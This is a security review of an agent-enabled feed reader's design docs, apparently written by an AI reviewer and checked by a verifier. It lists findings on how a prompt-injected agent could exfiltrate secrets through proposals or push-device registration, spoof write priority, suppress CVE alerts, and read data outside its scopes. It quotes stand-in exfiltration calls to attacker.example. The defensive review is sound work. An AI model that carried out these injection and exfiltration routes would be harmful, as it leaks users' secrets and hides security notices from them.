# Round 9 review: agent governance and threat model

Reviewer: MiMo V2.6 Pro. Verifier: GLM-5.3, asked to refute each finding. The report is unedited; the verdicts follow it.

ID: SEC-1
Severity: blocking
Location: docs/research/llm.md:145
Issue: The proposal channel lets a prompt-injected agent stage the exact exfiltration that invariant 2 bans (`subscribe("https://attacker.example/?secret=...")`) and complete it with one approval click, since tier 4 explicitly lets agents propose new subscriptions, new webhooks (an outbound destination URL the agent chose) and new tokens (with agent-chosen scopes/allowlist/budget), and no control governs what a proposal may carry or how it is shown.
Evidence: llm.md:145 "Subscribe, unsubscribe, refresh, delete, new tokens, new rules, new webhooks | You, in the UI or CLI. Agents can file a proposal"; api.md:49 "`proposal` | Something an agent wants and you must approve"; api.md:274 "subscribe(\"https://attacker.example/?secret=...\") would turn Earnest into an exfiltration channel"; api.md:270 "records a proposal and **fetches nothing until you approve**" (i.e. fetches on approve); features.md:95 "Proposals (agent asks, you approve)" — while compiled rules get feed-ID resolution and a dry run (llm.md:51), no such review control is specified for proposals, and ux.md has no proposal-review flow at all.
Fix: Never let a proposal carry agent-supplied URLs, destinations or scope/allowlist/budget deltas — the approving human enters or independently confirms the URL and scopes (or the fetch is done through a fixed relay that strips query/path), and forbid webhook/token proposals entirely.

ID: SEC-2
Severity: major
Location: docs/research/api.md:184
Issue: Push-device registration is an outbound-destination control exactly like webhooks, yet `POST /v1/devices` (resource `device` = "transport, endpoint, keys") is in no action tier and missing from the agent never-list, so an agent token (or a device proposal) that reaches it gives the server a fetch target the agent chose — every push then POSTs to `https://attacker/?s=<secret>`, closing the exfil in one request.
Evidence: api.md:51 "`device` | Push registration: transport, endpoint, keys"; api.md:184 "GET,POST /v1/devices · DELETE /v1/devices/{id}"; api.md:204 "Agent tokens can **never** hold `feeds:write`, `webhooks:write`, token management or `admin`" (devices omitted) vs api.md:52 "`webhook` ... Created by you only"; llm.md:139-145 tier table covers webhooks but never devices; llm.md:115 "No agent-reachable operation can cause an outbound request to a URL influenced by agent input".
Fix: Add device/push registration to tier 4 and the agent never-list (session-only), and route push endpoints through the same outbound rules as webhooks.

ID: SEC-3
Severity: major
Location: docs/research/api.md:87
Issue: `POST /v1/state:batch` accepts `source` from the caller while the conflict policy ranks writes by source, so an agent holding `state:write-human` can submit `source: "deliberate"` with a fresh `occurred_at` and its writes outrank the user's own deliberate actions — the very order ("whatever the clocks say") the policy exists to enforce.
Evidence: api.md:87 "takes a list of `{op_id, entry_id, register, value, base_rev, occurred_at, source}`"; api.md:79 "Rank by source: **your deliberate action, then a rule or agent, then passive**, whatever the clocks say"; api.md:117 "Writing your state requires a separate scope, is logged, and can be reverted only if nothing has changed since" (intended rank 2, spoofable to rank 1); llm.md:118 "A table in a document isn't a control."
Fix: Derive `source` server-side from the authenticated principal and operation semantics (as the Google Reader mapping already does) and reject or ignore any client-supplied value.

ID: SEC-4
Severity: major
Location: docs/research/llm.md:142
Issue: An injected agent with `state:write-human` can suppress security-relevant content before it is seen — shelve/`done` the entry carrying the "CVE in rustls" alert (or everything new since its position via bulk `state:through`) — and the only stated controls (log, revert-if-unchanged) never fire because the user doesn't know anything was hidden.
Evidence: llm.md:142 "Tag, shelf changes | Your compiled rules; agents with `state:write-human`; all logged | Yes, if the register is unchanged since"; api.md:270 "`triage`, which changes your state and returns a revert handle"; api.md:218 the very example an attacker would suppress: `"note": "CVE in rustls. Affects a crate you follow."`; llm.md:112-123 the invariants cover exfiltration only, no integrity/availability bound.
Fix: Forbid agent state writes on entries with a pending or delivered notification and cap `state:write-human`/`state:through` volume, or demote human-state changes to proposal-gated actions.

ID: SEC-5
Severity: major
Location: docs/research/api.md:204
Issue: The scope model assigns rights only to the eight MCP tools, leaving `/v1/changes`, `/v1/events`, `/v1/opml`, `/v1/export`, `GET /v1/notifications` and `GET /v1/activity` with no stated scope or allowlist filter, so an agent token can read the user's reading history (`"by": "p_me"` change rows, entries from every subscription including private feeds) and account-wide metadata far beyond its feed allowlist.
Evidence: api.md:204 lists scopes only as "`entries:read` (limited to the feed allowlist), `annotations:write`, `position:own`, `notify:send`, `proposals:write`, `state:write-human`, `notify:urgent`" while api.md:169-190 lists Sync/Export/Notify GET/Activity/OPML endpoints with no scope; api.md:120 "\"value\": \"done\", \"by\": \"p_me\", \"state_rev\": 7" (user actions in the change feed); llm.md:155 "Return titles and summaries by default, and full bodies only on request"; llm.md:153 "never private feeds by default".
Fix: Assign every endpoint an explicit scope and principal filter, defaulting agent tokens to deny on changes/events/opml/export/activity and cross-principal notification reads.

ID: SEC-6
Severity: minor
Location: docs/research/api.md:261
Issue: Private-feed partitioning of clusters is stated only "across users", so a cluster can mix a private-feed entry with allowlisted public entries and `get_briefing`'s "grouped ... by cluster" can hand a non-allowlisted agent private-feed titles and IDs, with nothing stating cluster grouping is filtered per token allowlist.
Evidence: api.md:39 "Feeds with credentials are private to their owner: never deduplicated across users, partitioned in clusters and retrieval" (boundary is owner, not token); api.md:261 "What's new since this agent's position, grouped by cadence, and by cluster once those exist. Titles and IDs by default"; llm.md:153 "scheduled agents see the feeds you selected, and never private feeds by default".
Fix: State that cluster membership and grouping in agent-visible results are filtered to the requesting token's feed allowlist at read time.

ID: SEC-7
Severity: minor
Location: docs/research/llm.md:76
Issue: The second-order injection exclusion list omits full-text search and ask-my-feeds retrieval, so whether agent annotations are indexed and retrievable into model context is unspecified, re-opening the very channel the annotation store paragraph claims to close.
Evidence: llm.md:76 "They stay out of embeddings, clustering, editions and classifier context. Otherwise annotations become a second-order injection channel"; api.md:264 "`search` | entries:read | ... Full-text search with snippets; hybrid once embeddings exist"; llm.md:135 "Ask my feeds retrieves a malicious article | No tools. Answers render as text with verified passages" — the attacks table constrains what retrieval returns, not what retrieval can pull agent-written annotation text into context for.
Fix: Exclude agent annotations from the search index and all model-retrieval contexts (search, ask my feeds, briefing composition), returning them only in clearly labelled agent output.

## Verification

- **SEC-1: CONFIRMED.** llm.md:145 lets agents propose subscriptions/webhooks/tokens and api.md:270 confirms the fetch happens on approval ("fetches nothing until you approve"), while no doc constrains what a proposal carries or how it is reviewed (api.md:49, features.md:95; ux.md contains no proposal flow at all), so the exact exfiltration api.md:274 bans returns behind one approval click; a residual risk validation.md:31-32 does not record (it covers only the direct `subscribe`/`webhooks:write` bans).
- **SEC-2: CONFIRMED.** The `device` resource (api.md:51) and `GET,POST /v1/devices` (api.md:184) appear in no action tier (llm.md:139-145 covers webhooks but never devices) and in no never-list (api.md:204 bans only `feeds:write`, `webhooks:write`, token management, `admin`), and unlike webhooks ("Created by you only", api.md:52) device registration gets no ownership, scope or outbound-rule statement anywhere in the docs.
- **SEC-3: CONFIRMED.** `POST /v1/state:batch` takes caller-supplied `source` (api.md:87) which the conflict policy ranks above agent writes "whatever the clocks say" (api.md:79), no doc derives `source` server-side for native writes (only the Google Reader mapping does, api.md:95-104), and validation.md records nothing on spoofing; the helper notes the quote sits at api.md:108 rather than 117.
- **SEC-4: PLAUSIBLE.** The mechanics reproduce (llm.md:142 grants agents shelf changes with only logging and revert-if-unchanged, api.md:91 allows bulk `state:through`, and invariants llm.md:114-121 bound exfiltration only), but ux.md specifies designed detection ("Nothing happens behind your back", ux.md:11; the "While you were out" activity surface with revert, ux.md:140), so the claim that the user doesn't know anything was hidden is an effectiveness judgment the helper could not fully confirm.
- **SEC-5: CONFIRMED.** Agent scopes are enumerated only for the eight tools (api.md:204) while `/v1/changes`, `/v1/events`, `/v1/opml`, `/v1/export`, `GET /v1/notifications` and `/v1/activity` (api.md:171-190) carry no scope or allowlist filter anywhere, and the change feed exposes the user's own reading-history rows (`"by": "p_me"`, api.md:120) plus subscription IDs, bypassing the feed allowlist and llm.md:153's private-feed default.
- **SEC-6: CONFIRMED.** Private-feed partitioning is stated only per owner / "across users" (api.md:39), and no doc states that `get_briefing`'s cluster grouping (api.md:261) is filtered to the requesting token's feed allowlist (llm.md:153), leaving the private-feed/allowlist interaction with clusters unspecified.
- **SEC-7: CONFIRMED.** The exclusion list covers only "embeddings, clustering, editions and classifier context" (llm.md:76), while `search` (api.md:264) and ask-my-feeds retrieval (llm.md:135 constrains what malicious articles can do, not whether annotation text is retrieved) are unaddressed, so whether agent annotations are indexed into model-retrievable context is genuinely unspecified.
